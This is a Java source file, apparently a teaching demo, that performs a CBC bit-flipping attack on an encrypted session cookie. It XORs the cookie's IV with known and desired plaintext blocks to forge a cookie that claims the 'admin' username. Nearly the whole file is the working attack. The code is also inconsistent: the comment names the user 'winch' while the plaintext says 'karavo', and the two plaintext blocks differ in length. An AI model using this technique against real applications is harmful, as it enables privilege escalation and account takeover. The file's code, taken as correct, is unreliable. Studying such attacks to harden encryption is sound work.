/*
 * Copyright 2002-2013 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

import org.apache.commons.codec.binary.Base64;



import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import java.security.GeneralSecurityException;
import java.security.NoSuchAlgorithmException;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Rob Winch
 */
public class Main {

	public static void main(String[] args) throws Exception {
		

		// we login as "winch"
		String userCookie="x8qGEpvYAhxUYVlVTWLXW9MKb0uJMUk3WXVAbmKcrZERCnHEmmpZZDSYCm/Jk4tCS6SOARFxYQ53L92zbY98hywVDCHH6svMAj7nr5AiQhU=";		
		System.out.println("my cookie is: "+userCookie);
		

		// Let's hack it to say we are an admin
		// we know the format of the cookie and we know the data of the user we logged in as
		String winchPlainTextFirstBlock = "username=karavo&f";
		// we want to be logged in as "admin"
		String adminPlainTextFirstBlock = "username=admin&f";
		// To hack it we need to calculate
		// iv xor originalPlainText xor desiredPlainText
		byte[] originalIv = Utils.extractIv(userCookie);
		byte[] xorIvAndOriginalPlainText = Utils.xor(originalIv, winchPlainTextFirstBlock.getBytes());
		byte[] adminIv = Utils.xor(xorIvAndOriginalPlainText, adminPlainTextFirstBlock.getBytes());
		// now use the newly calculated adminIv with the originalEncryptedText
		byte[] originalEncryptedText = Utils.extractMessage(userCookie);
		String adminCookie = Utils.createEncryptedCookie(adminIv, originalEncryptedText);
		System.out.println("admin cookie is : "+adminCookie);

	}
}
